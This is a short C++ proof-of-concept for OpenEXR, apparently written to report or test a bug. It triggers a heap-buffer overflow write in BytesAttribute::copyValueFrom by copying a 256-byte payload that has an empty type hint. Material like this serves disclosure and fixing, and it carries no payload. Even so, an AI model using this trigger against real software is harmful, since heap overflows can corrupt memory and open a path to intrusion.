// Residual memory-safety PoC: BytesAttribute::copyValueFrom computes the
// destination buffer size from the wrong field, causing a heap-buffer
// overflow write when copying a byte attribute with a non-empty payload
// and an empty type hint onto an existing attribute object.
//
// Public API used: Imf::BytesAttribute (ImfBytesAttribute.h), which is
// part of OpenEXR's public attribute API used for storing/loading custom
// binary attributes in an EXR header.
#include "ImfBytesAttribute.h"

#include <cstdio>
#include <vector>

using namespace OPENEXR_IMF_NAMESPACE;

int main ()
{
    std::vector<unsigned char> payload (256, 0x41);

    // Ordinary, in-contract bytes attribute: 256 bytes of data, no type hint.
    BytesAttribute src (payload.size (), payload.data (), "");

    // An existing attribute object, as an application would hold when
    // re-using/updating an attribute value in place.
    BytesAttribute dst;

    // Documented public API for assigning one attribute's value onto an
    // existing attribute of the same type.
    dst.copyValueFrom (src);

    std::printf ("copied %zu bytes, no crash\n", dst.size ());
    return 0;
}
